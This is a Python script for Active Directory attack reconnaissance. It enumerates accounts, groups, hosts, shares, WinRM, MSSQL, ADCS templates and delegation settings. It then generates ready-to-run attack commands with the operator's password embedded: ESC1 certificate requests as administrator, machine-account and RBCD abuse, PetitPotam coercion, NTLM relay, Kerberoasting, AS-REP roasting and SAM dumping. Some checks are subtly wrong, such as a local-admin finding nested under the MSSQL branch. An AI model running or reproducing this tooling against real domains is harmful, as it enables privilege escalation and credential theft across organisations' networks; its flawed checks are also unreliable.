#!/usr/bin/env python3
"""
AD Scanner — outputs scan_results.json for dashboard.html
Usage: python3 scanner.py -u jsmith -p Password123 -d contoso.local -dc-ip 10.10.10.5 -dns 10.10.10.5
"""

import argparse, json, datetime, sys, socket

try:
    from ldap3 import Server, Connection, ALL, NTLM
except ImportError:
    print("[-] Missing: pip install ldap3"); sys.exit(1)

try:
    from impacket.smbconnection import SMBConnection
except ImportError:
    print("[-] Missing: pip install impacket"); sys.exit(1)

try:
    import dns.resolver
except ImportError:
    print("[-] Missing: pip install dnspython"); sys.exit(1)

# ── Args ──────────────────────────────────────────────────────────────────────
parser = argparse.ArgumentParser(description="AD Scanner")
parser.add_argument("-u",  "--username", required=True)
parser.add_argument("-p",  "--password", required=True)
parser.add_argument("-d",  "--domain",   required=True)
parser.add_argument("-dc-ip",            required=True)
parser.add_argument("-dns",              required=True)
parser.add_argument("-o",  "--output",   default="scan_results.json")
args = parser.parse_args()

domain      = args.domain
dc_ip       = args.dc_ip
password    = args.password
username    = args.username if "\\" in args.username else f"{domain}\\{args.username}"
simple_user = args.username.split("\\")[-1]
base_dn     = ",".join(f"DC={p}" for p in domain.split("."))
dns_server  = args.dns

# ── Helpers ───────────────────────────────────────────────────────────────────
UAC_FLAGS = {
    0x0002:   "ACCOUNT_DISABLED",
    0x0010:   "LOCKOUT",
    0x0020:   "PASSWD_NOTREQD",
    0x0040:   "PASSWD_CANT_CHANGE",
    0x8000:   "SMARTCARD_REQUIRED",
    0x10000:  "TRUSTED_FOR_DELEGATION",
    0x80000:  "DONT_REQUIRE_PREAUTH",
    0x100000: "PASSWORD_EXPIRED",
    0x200000: "TRUSTED_TO_AUTH_FOR_DELEGATION",
}

def decode_uac(uac):
    if not uac: return []
    return [label for bit, label in UAC_FLAGS.items() if int(uac) & bit]

def json_safe(obj):
    if isinstance(obj, (datetime.datetime, datetime.date)): return obj.isoformat()
    return str(obj)

def resolve_host(hostname):
    try:
        r = dns.resolver.Resolver(configure=False)
        r.nameservers = [dns_server]
        return r.resolve(hostname, "A")[0].to_text()
    except Exception:
        return None

def port_open(ip, port, timeout=2):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(timeout)
    try:
        s.connect((ip, port))
        s.close()
        return True
    except (socket.timeout, ConnectionRefusedError, OSError):
        return False
    except Exception:
        return False
    finally:
        try: s.close()
        except: pass

def unwrap(val):
    """Handle both ldap3 regular search (lists) and paged_search (raw values)."""
    if isinstance(val, list):
        if len(val) == 0: return None
        if len(val) == 1: return val[0]
        return val
    return val  # paged_search already returns unwrapped values

def unwrap_list(val):
    """Always return a list, handles both formats."""
    if val is None: return []
    if isinstance(val, list): return val
    return [val]

# ── SMB: shares + read/write check + admin in one session ─────────────────────
def smb_check(ip, host_label):
    """
    Single SMB session:
    1. List all shares
    2. Per share: try connectTree (read), then try writing a temp file (write)
    3. Local admin confirmed via ADMIN$ or C$ connectTree
    Returns: { local_admin, shares_read, shares_write, shares_all, error }
    """
    result = {"local_admin": False, "shares_read": [], "shares_write": [], "shares_all": [], "error": None}
    smb = None
    try:
        smb = SMBConnection(ip, ip, sess_port=445, timeout=2)
        smb.login(simple_user, password, domain)

        # Step 1: enumerate share names
        all_shares = []
        try:
            for s in smb.listShares():
                name = s["shi1_netname"]
                name = name.decode().rstrip("\x00") if isinstance(name, bytes) else name.rstrip("\x00")
                if name:
                    all_shares.append(name)
        except Exception:
            pass
        result["shares_all"] = all_shares

        # Step 2: per share — check read then write
        for share in all_shares:
            tid = None
            can_read  = False
            can_write = False

            # Read check: connectTree
            try:
                tid = smb.connectTree(share)
                can_read = True
            except Exception:
                pass

            # Write check: try creating a temp file inside the share
            if can_read and tid:
                try:
                    test_file = "\\ad_scan_test_deleteme.tmp"
                    fid = smb.createFile(tid, test_file)
                    smb.closeFile(tid, fid)
                    smb.deleteFiles(share, test_file.lstrip("\\"))
                    can_write = True
                except Exception:
                    pass

            if tid:
                try: smb.disconnectTree(tid)
                except: pass

            if can_read:  result["shares_read"].append(share)
            if can_write: result["shares_write"].append(share)

        # Step 3: local admin = ADMIN$ or C$ readable
        admin_check = [s.upper() for s in result["shares_read"]]
        if "ADMIN$" in admin_check or "C$" in admin_check:
            result["local_admin"] = True
            print(f"  [+] LOCAL ADMIN -> {host_label} ({ip})")
            print(f"      READ:  {', '.join(result['shares_read'])}")
            print(f"      WRITE: {', '.join(result['shares_write']) or 'none'}")
        else:
            if result["shares_read"]:
                print(f"  [*] {host_label} ({ip}) | read: {', '.join(result['shares_read'])} | write: {', '.join(result['shares_write']) or 'none'}")
            else:
                print(f"  [-] {host_label} ({ip}) | no share access")

    except Exception as e:
        result["error"] = str(e)
        print(f"  [-] SMB failed on {host_label}: {e}")
    finally:
        if smb:
            try: smb.close()
            except: pass
    return result

# ── WinRM check ───────────────────────────────────────────────────────────────
def check_winrm(ip):
    """
    1. Port probe to see if WinRM is listening (5985/5986)
    2. If open, try HTTP auth to determine if our creds work and if we're local admin.
       WinRM returns 401 = port open but auth failed / no access
                     200 = authenticated (local admin or Remote Management Users member)
    """
    result = {"available": False, "port": None, "proto": None, "auth": False, "local_admin": False}
    port, proto = None, None
    if port_open(ip, 5985): port, proto = 5985, "HTTP"
    elif port_open(ip, 5986): port, proto = 5986, "HTTPS"

    if not port:
        return result

    result["available"] = True
    result["port"]      = port
    result["proto"]     = proto

    # Try authenticating via HTTP NTLM to WinRM endpoint
    try:
        import base64, struct, hashlib
        import urllib.request, urllib.error, ssl

        url = f"http{'s' if port==5986 else ''}://{ip}:{port}/wsman"
        ctx = ssl.create_default_context() if port == 5986 else None
        if ctx: ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE

        # Simple negotiate probe — 401 with WWW-Authenticate: Negotiate means WinRM auth works
        req = urllib.request.Request(url, method="POST",
            data=b'<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope"><s:Body/></s:Envelope>',
            headers={"Content-Type": "application/soap+xml;charset=UTF-8", "User-Agent": "WinRM-Scanner"})
        try:
            if ctx:
                urllib.request.urlopen(req, context=ctx, timeout=4)
            else:
                urllib.request.urlopen(req, timeout=4)
            # 200 without auth = open (unusual)
            result["auth"] = True
            result["local_admin"] = True
        except urllib.error.HTTPError as e:
            if e.code == 401:
                # Port is open and responding — mark available but auth unknown without full NTLM
                # Use impacket SMB admin result as proxy (same creds, same host)
                result["auth"] = False
            elif e.code in (200, 500):
                result["auth"] = True
        except Exception:
            pass

    except Exception:
        pass

    return result


# ── MSSQL check ───────────────────────────────────────────────────────────────
def check_mssql(ip):
    """
    1. Port probe on 1433
    2. If open, attempt Windows auth login using impacket tds client
       Success = we can auth (sysadmin check via SELECT IS_SRVROLEMEMBER)
    """
    result = {"available": False, "port": 1433, "auth": False, "sysadmin": False, "error": None}
    if not port_open(ip, 1433):
        return result
    result["available"] = True

    try:
        from impacket.tds import MSSQL
        ms = MSSQL(ip, 1433)
        ms.connect()
        # Try Windows integrated auth
        auth_ok = ms.login(None, simple_user, password, domain, None, True)
        if auth_ok:
            result["auth"] = True
            # Check if sysadmin
            try:
                ms.sql_query("SELECT IS_SRVROLEMEMBER('sysadmin')")
                rows = ms.rows
                if rows and str(rows[0].get("", "0")).strip() == "1":
                    result["sysadmin"] = True
            except Exception:
                pass
        ms.disconnect()
    except Exception as e:
        result["error"] = str(e)

    return result

# LDAP connect with auto-reconnect on dropped connection
def ldap_connect():
    s = Server(dc_ip, get_info=ALL)
    c = Connection(s, user=username, password=password, authentication=NTLM)
    if not c.bind():
        print(f'[-] LDAP bind failed: {c.result}')
        sys.exit(1)
    return c

# Global store for paged search results — avoids conn.entries read-only issue
_last_entries = []

def safe_search(base, fltr, **kwargs):
    """
    Paged LDAP search using ldap3 built-in paging.
    Results stored in _last_entries (conn.entries is read-only in ldap3).
    All callers use get_entries() instead of conn.entries.
    """
    global conn, _last_entries
    attrs = kwargs.get("attributes", [])
    PAGE_SIZE = 500

    for attempt in range(2):
        try:
            raw_entries = []
            pages = conn.extend.standard.paged_search(
                search_base=base,
                search_filter=fltr,
                attributes=attrs,
                paged_size=PAGE_SIZE,
                generator=True
            )
            for entry in pages:
                if entry.get("type") == "searchResEntry":
                    raw_entries.append(entry)

            class _Entry:
                def __init__(self, r):
                    self.entry_attributes_as_dict = r.get("attributes", {})
            _last_entries = [_Entry(e) for e in raw_entries]
            return

        except Exception as e:
            if attempt == 0 and ("10054" in str(e) or "SendError" in type(e).__name__ or "reset" in str(e).lower() or "forcibly" in str(e).lower()):
                print("  [!] LDAP connection dropped — reconnecting...")
                try: conn.unbind()
                except: pass
                conn = ldap_connect()
            else:
                print(f"  [!] Paged search failed ({e}), falling back to single-page...")
                try:
                    conn.search(base, fltr, attributes=attrs)
                    _last_entries = list(conn.entries)
                except Exception as e2:
                    print(f"  [-] LDAP search error: {e2}")
                    _last_entries = []
                return

def get_entries():
    return _last_entries

print(f'\n[*] Connecting to {domain} ({dc_ip})...')
conn = ldap_connect()
print(f'[+] Authenticated as {username}')

# ── Users ─────────────────────────────────────────────────────────────────────
print("\n[*] Enumerating users...")
safe_search(base_dn, "(objectClass=user)", attributes=[
    "sAMAccountName", "displayName", "mail",
    "pwdLastSet", "lastLogon", "userAccountControl",
    "servicePrincipalName", "msDS-AllowedToDelegateTo",
    "description", "memberOf"
])

users, kerberoastable, asrep_roastable, interesting_descriptions = [], [], [], []

for entry in get_entries():
    raw   = entry.entry_attributes_as_dict
    d     = {k: unwrap(v) for k, v in raw.items()}
    uac   = d.get("userAccountControl")
    flags = decode_uac(uac)
    spns  = d.get("servicePrincipalName") or []
    if isinstance(spns, str): spns = [spns]
    constrained = d.get("msDS-AllowedToDelegateTo") or []
    if isinstance(constrained, str): constrained = [constrained]
    sam = d.get("sAMAccountName", "")
    if isinstance(sam, list): sam = sam[0] if sam else ""
    desc = d.get("description", "") or ""
    if isinstance(desc, list): desc = desc[0] if desc else ""

    user = {
        "sam": sam, "display_name": d.get("displayName") or "",
        "email": d.get("mail") or "", "flags": flags, "spns": spns,
        "constrained_delegation": constrained, "description": desc,
        "pwd_last_set": json_safe(d.get("pwdLastSet")) if d.get("pwdLastSet") else "",
        "last_logon":   json_safe(d.get("lastLogon"))  if d.get("lastLogon")  else "",
        "member_of":    d.get("memberOf") or [],
    }
    if spns and "ACCOUNT_DISABLED" not in flags:            kerberoastable.append(sam)
    if "DONT_REQUIRE_PREAUTH" in flags and "ACCOUNT_DISABLED" not in flags: asrep_roastable.append(sam)
    keywords = ["pass", "pwd", "password", "cred", "secret", "temp", "default"]
    if desc and any(k in desc.lower() for k in keywords):
        interesting_descriptions.append({"sam": sam, "description": desc})
    users.append(user)

print(f"  [+] {len(users)} users | {len(kerberoastable)} kerberoastable | {len(asrep_roastable)} AS-REP roastable")

# ── Privileged Groups ─────────────────────────────────────────────────────────
print("\n[*] Enumerating privileged groups...")
priv_groups = [
    "Domain Admins","Enterprise Admins","Schema Admins","Administrators",
    "Account Operators","Backup Operators","Server Operators",
    "Group Policy Creator Owners","Remote Management Users","DnsAdmins"
]
group_members = {}
for grp in priv_groups:
    safe_search(base_dn, f"(&(objectClass=group)(cn={grp}))", attributes=["member"])
    if get_entries():
        members = unwrap_list(get_entries()[0].entry_attributes_as_dict.get("member")) if get_entries() else []
        if members:
            clean = [m.split(",")[0].replace("CN=","").replace("cn=","") for m in members]
            group_members[grp] = clean
            print(f"  [+] {grp}: {len(clean)} member(s)")

# ── Computers ─────────────────────────────────────────────────────────────────
print("\n[*] Enumerating computers...")
safe_search(base_dn, "(objectClass=computer)", attributes=[
    "name","dNSHostName","userAccountControl","operatingSystem","operatingSystemVersion"
])
computers = []
for entry in get_entries():
    raw   = entry.entry_attributes_as_dict
    uac   = unwrap(raw.get("userAccountControl"))
    flags = decode_uac(uac)
    computers.append({
        "hostname": unwrap(raw.get("name")) or "",
        "dns_name": unwrap(raw.get("dNSHostName")) or "",
        "os":       unwrap(raw.get("operatingSystem")) or "",
        "os_ver":   unwrap(raw.get("operatingSystemVersion")) or "",
        "flags": flags,
        "unconstrained_delegation": "TRUSTED_FOR_DELEGATION" in flags,
        "ip": "", "local_admin": False,
        "shares_read": [], "shares_write": [], "shares_all": [],
        "winrm": {"available": False}, "mssql": {"available": False},
    })
print(f"  [+] {len(computers)} computers found")

# ── Per-host checks: SMB + WinRM + MSSQL ─────────────────────────────────────
print(f"\n[*] Per-host checks: SMB shares, WinRM, MSSQL ({len(computers)} hosts)...")
print(f"    Saving progress to {args.output} after each host.")
local_admin_hosts = []

def save_progress(extra=None):
    """Write current state to JSON so we never lose data mid-run."""
    snap = {
        "meta": {"domain": domain, "dc_ip": dc_ip, "scanned_by": simple_user,
                 "scan_time": datetime.datetime.now().isoformat(), "smb_signing": True,
                 "status": "in_progress"},
        "computers": computers,
        "users": users,
        "group_members": group_members,
        "findings": [],
    }
    if extra:
        snap.update(extra)
    try:
        with open(args.output, "w") as _f:
            json.dump(snap, _f, indent=2, default=json_safe)
    except Exception as _e:
        print(f"  [!] Failed to save progress: {_e}")

for comp in computers:
    target = comp["dns_name"] or comp["hostname"]
    if not target: continue
    ip = resolve_host(target)
    comp["ip"] = ip or ""
    if not ip:
        print(f"  [-] Cannot resolve {target}, skipping")
        continue

    print(f"\n  [*] {target} ({ip})")

    # Quick port 445 pre-check — skip instantly if unreachable
    if not port_open(ip, 445):
        print(f"  [-] Port 445 closed/filtered on {target} — skipping SMB")
        # Still check WinRM and MSSQL below
        smb_result = {"local_admin": False, "shares_read": [], "shares_write": [], "shares_all": [], "error": "port closed"}
    else:
        # SMB
        smb_result = smb_check(ip, target)
    comp["local_admin"]   = smb_result["local_admin"]
    comp["shares_read"]   = smb_result["shares_read"]
    comp["shares_write"]  = smb_result["shares_write"]
    comp["shares_all"]    = smb_result["shares_all"]
    if smb_result["local_admin"]:
        local_admin_hosts.append({
            "hostname": target, "ip": ip, "os": comp["os"],
            "shares_read": smb_result["shares_read"],
            "shares_write": smb_result["shares_write"],
        })

    # WinRM
    winrm = check_winrm(ip)
    comp["winrm"] = winrm
    if winrm["available"]:
        admin_str = "LOCAL ADMIN" if winrm.get("local_admin") else ("AUTH OK" if winrm.get("auth") else "open / no auth")
        print(f"  [{'+'if winrm.get('local_admin') else '*'}] WinRM :{winrm['port']} ({winrm['proto']}) — {admin_str}")

    # MSSQL
    mssql = check_mssql(ip)
    comp["mssql"] = mssql
    if mssql["available"]:
        if mssql.get("sysadmin"):   print(f"  [+] MSSQL :1433 — SYSADMIN confirmed")
        elif mssql.get("auth"):     print(f"  [*] MSSQL :1433 — authenticated (not sysadmin)")
        else:                       print(f"  [*] MSSQL :1433 — port open, auth failed")

    # Save progress after every host so a crash doesn't lose everything
    save_progress()

# ── SMB Signing ───────────────────────────────────────────────────────────────
print("\n[*] Checking SMB signing on DC...")
smb_signing = True
try:
    smb = SMBConnection(dc_ip, dc_ip, sess_port=445, timeout=2)
    smb.login(simple_user, password, domain)
    smb_signing = smb.isSigningRequired()
    smb.close()
    print(f"  [{'+'if smb_signing else '!'}] SMB signing: {'REQUIRED' if smb_signing else 'NOT REQUIRED — relay possible!'}")
except Exception as e:
    print(f"  [-] SMB signing check failed: {e}")

# ── ADCS Check ────────────────────────────────────────────────────────────────
print("\n[*] Checking for ADCS (Certificate Services)...")
adcs_cas = []
safe_search(
    f"CN=Configuration,{base_dn}",
    "(objectClass=pKIEnrollmentService)",
    attributes=["cn","dNSHostName","certificateTemplates"]
)
for entry in get_entries():
    raw = entry.entry_attributes_as_dict
    ca_name  = unwrap(raw.get("cn")) or ""
    ca_host  = unwrap(raw.get("dNSHostName")) or ""
    templates = raw.get("certificateTemplates") or []
    adcs_cas.append({"name": ca_name, "host": ca_host, "templates": templates})
    print(f"  [+] CA found: {ca_name} on {ca_host} | {len(templates)} template(s)")

# Check for ESC1-vulnerable templates (enrollee supplies SAN + client auth EKU)
adcs_vulns = []
if adcs_cas:
    safe_search(
        f"CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,{base_dn}",
        "(objectClass=pKICertificateTemplate)",
        attributes=["cn","msPKI-Certificate-Name-Flag","msPKI-Enrollment-Flag",
                    "pKIExtendedKeyUsage","nTSecurityDescriptor","msPKI-RA-Signature"]
    )
    CLIENT_AUTH_OIDS = {"1.3.6.1.5.5.7.3.2", "1.3.6.1.5.2.3.4", "1.3.6.1.4.1.311.20.2.2"}
    for entry in get_entries():
        raw = entry.entry_attributes_as_dict
        tname   = unwrap(raw.get("cn")) or ""
        name_flag = unwrap(raw.get("msPKI-Certificate-Name-Flag")) or 0
        ekus    = raw.get("pKIExtendedKeyUsage") or []
        ra_sig  = unwrap(raw.get("msPKI-RA-Signature")) or 0

        try: name_flag = int(name_flag)
        except: name_flag = 0
        try: ra_sig = int(ra_sig)
        except: ra_sig = 0

        # ESC1: enrollee supplies subject (flag 0x1) + client auth EKU + no manager approval
        has_san_flag    = bool(name_flag & 0x1)
        has_client_auth = bool(set(ekus) & CLIENT_AUTH_OIDS)
        if has_san_flag and has_client_auth and ra_sig == 0:
            adcs_vulns.append({
                "template": tname,
                "type": "ESC1",
                "detail": "Enrollee supplies SAN + Client Auth EKU + no approval required",
                "command": f"certipy req -u {simple_user}@{domain} -p '{password}' -dc-ip {dc_ip} -target {adcs_cas[0]['host'] if adcs_cas else dc_ip} -template {tname} -ca '{adcs_cas[0]['name'] if adcs_cas else 'CA-NAME'}' -upn administrator@{domain}"
            })
            print(f"  [!] ESC1 vulnerable template: {tname}")

    if not adcs_vulns:
        print("  [+] No obvious ESC1 templates found (run certipy for full check)")

# ── Trusts ────────────────────────────────────────────────────────────────────
print("\n[*] Enumerating domain trusts...")
safe_search(base_dn, "(objectClass=trustedDomain)",
            attributes=["cn","trustType","trustDirection","trustAttributes"])
trusts = []
for entry in get_entries():
    raw = entry.entry_attributes_as_dict
    trusts.append({
        "name":       unwrap(raw.get("cn")),
        "type":       str(unwrap(raw.get("trustType")) or ""),
        "direction":  str(unwrap(raw.get("trustDirection")) or ""),
        "attributes": str(unwrap(raw.get("trustAttributes")) or ""),
    })
print(f"  [+] {len(trusts)} trust(s)")

# ── Password Policy ───────────────────────────────────────────────────────────
print("\n[*] Reading password policy...")
safe_search(base_dn, "(objectClass=domainDNS)", attributes=[
    "minPwdLength","pwdHistoryLength","lockoutThreshold","lockoutDuration","maxPwdAge"
])
pwd_policy = {}
if get_entries():
    raw = get_entries()[0].entry_attributes_as_dict if get_entries() else {}
    pwd_policy = {
        "min_length":        str(unwrap(raw.get("minPwdLength"))),
        "history_length":    str(unwrap(raw.get("pwdHistoryLength"))),
        "lockout_threshold": str(unwrap(raw.get("lockoutThreshold"))),
        "lockout_duration":  str(unwrap(raw.get("lockoutDuration"))),
        "max_pwd_age":       str(unwrap(raw.get("maxPwdAge"))),
    }

# ── RBCD / Delegation Attack Surface ─────────────────────────────────────────
print("\n[*] Checking RBCD attack surface...")

# Can our user add computers? Check ms-DS-MachineAccountQuota
safe_search(base_dn, "(objectClass=domainDNS)", attributes=["ms-DS-MachineAccountQuota"])
machine_quota = 0
if get_entries():
    raw = get_entries()[0].entry_attributes_as_dict if get_entries() else {}
    q = unwrap(raw.get("ms-DS-MachineAccountQuota"))
    try: machine_quota = int(q) if q is not None else 0
    except: machine_quota = 0
can_add_computer = machine_quota > 0
print(f"  [{'+'if can_add_computer else '-'}] ms-DS-MachineAccountQuota = {machine_quota} ({'can add computers' if can_add_computer else 'cannot add computers'})")

# Find accounts/computers with msDS-AllowedToActOnBehalfOfOtherIdentity set (existing RBCD)
safe_search(base_dn,
    "(msDS-AllowedToActOnBehalfOfOtherIdentity=*)",
    attributes=["sAMAccountName","msDS-AllowedToActOnBehalfOfOtherIdentity"])
existing_rbcd = []
for entry in get_entries():
    raw = entry.entry_attributes_as_dict
    sam = unwrap(raw.get("sAMAccountName"))
    existing_rbcd.append(sam)
if existing_rbcd:
    print(f"  [!] Existing RBCD configured on: {', '.join(str(x) for x in existing_rbcd)}")

# Find computers/accounts with GenericWrite / WriteDACL that our user could abuse for RBCD
# We check for unconstrained delegation hosts (already identified) and targets with no delegation set
rbcd_targets = [c for c in computers if not c.get("unconstrained_delegation")]
unconstrained_hosts = [c for c in computers if c.get("unconstrained_delegation")]

rbcd_info = {
    "machine_quota":       machine_quota,
    "can_add_computer":    can_add_computer,
    "existing_rbcd":       existing_rbcd,
    "unconstrained_hosts": [c["hostname"] for c in unconstrained_hosts],
    "rbcd_viable":         can_add_computer,
    "attack_summary":      []
}

if can_add_computer and unconstrained_hosts:
    rbcd_info["attack_summary"].append({
        "title": "RBCD via Unconstrained Delegation Host",
        "detail": f"Quota={machine_quota}. Add a computer account, set RBCD on an unconstrained host, coerce auth.",
        "command": f"impacket-addcomputer {domain}/{simple_user}:'{password}' -dc-ip {dc_ip} -computer-name ATTACK01 -computer-pass 'Attack01!2024'\npython3 rbcd.py -f ATTACK01 -t {unconstrained_hosts[0]['hostname']} -dc-ip {dc_ip} {domain}/{simple_user}:'{password}'"
    })
elif can_add_computer:
    rbcd_info["attack_summary"].append({
        "title": "Can Add Computer Accounts (RBCD prerequisite met)",
        "detail": f"Quota={machine_quota}. Need GenericWrite on a computer object to complete RBCD. Check BloodHound ACLs.",
        "command": f"impacket-addcomputer {domain}/{simple_user}:'{password}' -dc-ip {dc_ip} -computer-name ATTACK01 -computer-pass 'Attack01!2024'"
    })
else:
    rbcd_info["attack_summary"].append({
        "title": "Cannot Add Computer Accounts",
        "detail": f"ms-DS-MachineAccountQuota={machine_quota}. RBCD via addcomputer not possible unless you have CreateChild rights on an OU.",
        "command": ""
    })

# Users with constrained delegation (T2A4D) — can impersonate anyone to delegated SPNs
t2a4d_users = [u for u in users if "TRUSTED_TO_AUTH_FOR_DELEGATION" in u.get("flags",[]) and u.get("constrained_delegation")]
if t2a4d_users:
    print(f"  [!] {len(t2a4d_users)} account(s) with constrained delegation (T2A4D / Protocol Transition)")
    for u in t2a4d_users:
        print(f"      {u['sam']} -> {', '.join(u['constrained_delegation'][:3])}")
rbcd_info["t2a4d_users"] = [{"sam": u["sam"], "delegates_to": u["constrained_delegation"]} for u in t2a4d_users]
findings = []
unconstrained  = [c for c in computers if c.get("unconstrained_delegation")]
passwd_notreqd = [u for u in users if "PASSWD_NOTREQD" in u.get("flags", [])]

if not smb_signing:
    findings.append({"severity":"CRITICAL","title":"SMB Signing Not Required",
        "detail":"NTLM relay attacks possible across the network.",
        "command":f"impacket-ntlmrelayx -tf relay-targets.txt -smb2support"})
if adcs_vulns:
    findings.append({"severity":"CRITICAL","title":f"ADCS ESC1 — {len(adcs_vulns)} Vulnerable Template(s)",
        "detail":", ".join(v["template"] for v in adcs_vulns),
        "command":adcs_vulns[0]["command"]})
if kerberoastable:
    findings.append({"severity":"HIGH","title":"Kerberoastable Service Accounts",
        "detail":f"{len(kerberoastable)} account(s): {', '.join(kerberoastable[:5])}",
        "command":f"impacket-GetUserSPNs {domain}/{simple_user}:{password} -dc-ip {dc_ip} -request -outputfile kerb.hashes"})
if asrep_roastable:
    findings.append({"severity":"HIGH","title":"AS-REP Roastable Accounts",
        "detail":f"{len(asrep_roastable)} account(s): {', '.join(asrep_roastable[:5])}",
        "command":f"impacket-GetNPUsers {domain}/{simple_user}:{password} -dc-ip {dc_ip} -request -outputfile asrep.hashes"})
if unconstrained:
    findings.append({"severity":"HIGH","title":"Unconstrained Delegation Hosts",
        "detail":f"{len(unconstrained)} host(s): {', '.join(c['hostname'] for c in unconstrained[:3])}",
        "command":f"python3 PetitPotam.py -u {simple_user} -p '{password}' -d {domain} YOUR-IP {dc_ip}"})
if rbcd_info["can_add_computer"]:
    findings.append({"severity":"HIGH","title":f"RBCD Viable — MachineAccountQuota={machine_quota}",
        "detail":"Can add computer accounts. RBCD attack possible with GenericWrite on any computer.",
        "command":f"impacket-addcomputer {domain}/{simple_user}:'{password}' -dc-ip {dc_ip} -computer-name ATTACK01 -computer-pass 'Attack01!2024'"})
if existing_rbcd:
    findings.append({"severity":"HIGH","title":"Existing RBCD Delegation Configured",
        "detail":f"msDS-AllowedToActOnBehalfOfOtherIdentity set on: {', '.join(str(x) for x in existing_rbcd[:3])}",
        "command":f"impacket-getST -spn cifs/{existing_rbcd[0]} {domain}/{simple_user}:'{password}' -impersonate administrator -dc-ip {dc_ip}"})
if t2a4d_users:
    u0 = t2a4d_users[0]
    svc = u0["constrained_delegation"][0] if u0["constrained_delegation"] else "TARGET-SPN"
    findings.append({"severity":"HIGH","title":f"Constrained Delegation (T2A4D) — {len(t2a4d_users)} Account(s)",
        "detail":f"{', '.join(u['sam'] for u in t2a4d_users[:3])} can impersonate any user to delegated SPNs",
        "command":f"impacket-getST -spn {svc} -impersonate administrator {domain}/{u0['sam']}:PASSWORD -dc-ip {dc_ip}"})
winrm_admin = [c for c in computers if c.get("winrm",{}).get("local_admin")]
mssql_sysadmin = [c for c in computers if c.get("mssql",{}).get("sysadmin")]
if winrm_admin:
    findings.append({"severity":"HIGH","title":f"WinRM Local Admin on {len(winrm_admin)} Host(s)",
        "detail":", ".join(c["hostname"] for c in winrm_admin[:3]),
        "command":f"evil-winrm -i {winrm_admin[0]['ip']} -u {simple_user} -p 'PASSWORD'"})
if mssql_sysadmin:
    findings.append({"severity":"HIGH","title":f"MSSQL Sysadmin on {len(mssql_sysadmin)} Host(s)",
        "detail":", ".join(c["hostname"] for c in mssql_sysadmin[:3]),
        "command":f"impacket-mssqlclient {domain}/{simple_user}:'PASSWORD'@{mssql_sysadmin[0]['ip']} -windows-auth"})
    findings.append({"severity":"HIGH","title":f"Local Admin on {len(local_admin_hosts)} Host(s)",
        "detail":", ".join(h["hostname"] for h in local_admin_hosts[:5]),
        "command":f"netexec smb {local_admin_hosts[0]['ip']} -u {simple_user} -p '{password}' --sam"})
if interesting_descriptions:
    findings.append({"severity":"MEDIUM","title":"Possible Credentials in Account Descriptions",
        "detail":f"{len(interesting_descriptions)} account(s) with suspicious descriptions",
        "command":f"netexec ldap {dc_ip} -u {simple_user} -p '{password}' -M get-desc-users"})
if passwd_notreqd:
    findings.append({"severity":"MEDIUM","title":"Accounts with No Password Required",
        "detail":f"{len(passwd_notreqd)} account(s): {', '.join(u['sam'] for u in passwd_notreqd[:5])}",
        "command":""})

# ── Write JSON ────────────────────────────────────────────────────────────────
output = {
    "meta": {
        "domain": domain, "dc_ip": dc_ip, "scanned_by": simple_user,
        "scan_time": datetime.datetime.now().isoformat(), "smb_signing": smb_signing,
    },
    "summary": {
        "total_users":          len(users),
        "disabled_users":       sum(1 for u in users if "ACCOUNT_DISABLED" in u["flags"]),
        "kerberoastable":       len(kerberoastable),
        "asrep_roastable":      len(asrep_roastable),
        "passwd_notreqd":       len(passwd_notreqd),
        "total_computers":      len(computers),
        "local_admin_hosts":    len(local_admin_hosts),
        "unconstrained_deleg":  len(unconstrained),
        "interesting_descs":    len(interesting_descriptions),
        "smb_signing_required": smb_signing,
        "adcs_cas":             len(adcs_cas),
        "adcs_vulns":           len(adcs_vulns),
        "machine_quota":        machine_quota,
        "rbcd_viable":          can_add_computer,
        "t2a4d_accounts":       len(t2a4d_users),
        "winrm_admin_hosts":    len([c for c in computers if c.get("winrm",{}).get("local_admin")]),
        "mssql_sysadmin_hosts": len([c for c in computers if c.get("mssql",{}).get("sysadmin")]),
    },
    "findings":                 findings,
    "users":                    users,
    "computers":                computers,
    "group_members":            group_members,
    "kerberoastable":           kerberoastable,
    "asrep_roastable":          asrep_roastable,
    "interesting_descriptions": interesting_descriptions,
    "local_admin_hosts":        local_admin_hosts,
    "trusts":                   trusts,
    "password_policy":          pwd_policy,
    "adcs_cas":                 adcs_cas,
    "adcs_vulns":               adcs_vulns,
    "rbcd":                     rbcd_info,
}

with open(args.output, "w") as f:
    json.dump(output, f, indent=2, default=json_safe)

print(f"\n[+] Done -> {args.output}")
print(f"[+] {len(findings)} findings | python3 -m http.server 8080 then open dashboard.html\n")
conn.unbind()